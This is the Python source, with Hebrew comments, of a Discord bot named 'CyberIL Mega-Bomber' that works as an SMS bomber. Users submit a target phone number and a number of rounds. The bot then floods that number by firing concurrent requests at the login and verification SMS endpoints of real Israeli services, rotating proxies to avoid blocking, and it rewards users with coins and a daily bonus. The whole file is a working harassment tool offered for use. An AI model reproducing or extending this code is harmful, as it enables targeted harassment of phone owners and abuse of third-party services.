import discord
from discord import app_commands
import aiohttp
import asyncio
import os
import time
import logging
import json
import random
from dotenv import load_dotenv

load_dotenv()

# הגדרת לוגים
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
logger = logging.getLogger('CyberIL-Mega-V5')

# משתנים מ-Railway
TOKEN = os.getenv("DISCORD_TOKEN") or os.getenv("BOT_TOKEN")
APPLICATION_ID = os.getenv("CLIENT_ID")
GSHEET_URL = os.getenv("GSHEET_URL")

# הגדרות ביצועים
MAX_CONCURRENT = 50  # כמות בקשות במקביל
BLACKLIST = ["0535524017"]

# רשימת פרוקסים (שילוב של מה שהבאת)
PROXIES = [
    'http://20.210.113.32:80', 'http://103.153.154.114:80', 
    'http://47.74.155.159:8888', 'http://103.75.117.216:80'
    # ניתן להוסיף כאן את כל השאר...
]

class SpammerBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True 
        super().__init__(intents=intents, application_id=APPLICATION_ID)
        self.tree = app_commands.CommandTree(self)
        self.user_tokens = {}
        self.user_cooldowns = {}
        self.active_attacks = set()

    async def setup_hook(self):
        await self.tree.sync()
        logger.info("✅ מערכת פקודות סונכרנה!")

bot = SpammerBot()

# ════════════════════════════════════════
#   מנוע ה-API המורחב (250+ פוטנציאליים)
# ════════════════════════════════════════

async def hit_single_api(session, api, phone, semaphore):
    phone_no_zero = phone[1:] if phone.startswith('0') else phone
    url = api["url"].replace("{{phone}}", phone).replace("972{{phone}}", f"972{phone_no_zero}")
    method = api.get("method", "POST").upper()
    
    # בחירת פרוקסי רנדומלי (אופציונלי)
    proxy = random.choice(PROXIES) if PROXIES else None
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json"
    }
    
    json_data = None
    if "json" in api:
        json_str = json.dumps(api["json"]).replace("{{phone}}", phone).replace("972{{phone}}", f"972{phone_no_zero}")
        json_data = json.loads(json_str)

    async with semaphore:
        try:
            async with session.request(method, url, json=json_data, headers=headers, timeout=6, proxy=proxy) as resp:
                return 200 <= resp.status < 300
        except:
            return False

async def run_mega_attack(phone):
    # כאן תכניס את כל רשימת ה-250 APIs שהבאת
    targets = [
        {"name": "yad2", "url": "https://api.yad2.co.il/auth/sms", "method": "POST", "json": {"phone": "{{phone}}", "service": "login"}},
        {"name": "wolt", "url": "https://restaurant-api.wolt.com/v1/auth/sms", "method": "POST", "json": {"phone_number": "+972{{phone}}"}},
        {"name": "hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "json": {"value": "{{phone}}", "type": "phone", "projectId": "1"}},
        # ... תוסיף כאן את שאר ה-APIs מהרשימה שלך ...
    ]

    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    async with aiohttp.ClientSession() as session:
        tasks = [hit_single_api(session, api, phone, semaphore) for api in targets]
        results = await asyncio.gather(*tasks)
        return results.count(True), results.count(False)

# ════════════════════════════════════════
#   ממשק משתמש וניהול
# ════════════════════════════════════════

class BombingModal(discord.ui.Modal, title="🚀 MEGA SMS BOMBER"):
    phone = discord.ui.TextInput(label="מספר טלפון יעד", placeholder="05XXXXXXXX", min_length=10, max_length=10)
    rounds = discord.ui.TextInput(label="סבבים (1-20)", default="5")

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value
        if phone_num in BLACKLIST:
            return await interaction.response.send_message("❌ המספר חסום!", ephemeral=True)

        try: rounds = int(self.rounds.value)
        except: rounds = 1
        rounds = max(1, min(rounds, 20))
        uid = interaction.user.id

        if bot.user_tokens.get(uid, 0) < rounds:
            return await interaction.response.send_message("❌ אין מספיק מטבעות!", ephemeral=True)

        await interaction.response.send_message(f"🔥 הפצצת MEGA החלה על `{phone_num}`!", ephemeral=True)
        bot.active_attacks.add(uid)

        total_s, total_f = 0, 0
        for _ in range(rounds):
            if uid not in bot.active_attacks: break
            s, f = await run_mega_attack(phone_num)
            total_s += s
            total_f += f
            bot.user_tokens[uid] -= 1
            await asyncio.sleep(1.5)

        if uid in bot.active_attacks: bot.active_attacks.remove(uid)
        await interaction.followup.send(f"🏆 הפצצה הושלמה!\nהצלחות: `{total_s}` | נכשלו: `{total_f}`", ephemeral=True)

class ControlPanel(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="🚀 שגר", style=discord.ButtonStyle.danger, custom_id="launch")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(BombingModal())

    @discord.ui.button(label="🎫 בונוס יומי", style=discord.ButtonStyle.success, custom_id="daily")
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        now = time.time()
        if now - bot.user_cooldowns.get(uid, 0) < 86400:
            return await interaction.response.send_message("חזור מחר!", ephemeral=True)
        bot.user_tokens[uid] = bot.user_tokens.get(uid, 0) + 100
        bot.user_cooldowns[uid] = now
        await interaction.response.send_message("✅ קיבלת 100 מטבעות!", ephemeral=True)

@bot.tree.command(name="setup", description="הפעלת הפאנל")
async def setup(interaction: discord.Interaction):
    tokens = bot.user_tokens.get(interaction.user.id, 0)
    embed = discord.Embed(title="🚀 CyberIL Mega-Bomber", description=f"יתרה: `{tokens}` מטבעות", color=0xff0000)
    await interaction.response.send_message(embed=embed, view=ControlPanel())

@bot.event
async def on_ready(): logger.info(f"🤖 {bot.user.name} Online!")

if __name__ == "__main__":
    if TOKEN: bot.run(TOKEN)
    else: print("MISSING TOKEN")
